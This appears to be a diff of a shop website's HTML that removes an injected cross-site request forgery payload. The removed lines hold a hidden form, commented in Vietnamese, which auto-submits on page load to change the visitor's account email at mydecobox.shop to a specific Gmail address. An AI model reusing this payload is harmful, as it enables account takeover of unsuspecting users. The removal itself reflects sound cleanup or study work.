@@ -2971,20 +2971,5 @@
       defer
       data-wp-strategy="defer"
     ></script>
-    <!-- Form để gửi yêu cầu POST giả mạo -->
-    <form
-      id="csrfForm"
-      method="POST"
-      action="https://mydecobox.shop/my-account/edit-account/"
-    >
-      <input type="hidden" name="user_email" value="lcnhu.uit@gmail.com" />
-      <input type="submit" value="Submit" style="display: none" />
-      <!-- Ẩn nút submit -->
-    </form>
-
-    <script>
-      // Tự động gửi form khi trang được tải
-      document.getElementById("csrfForm").submit();
-    </script>
   </body>
 </html>
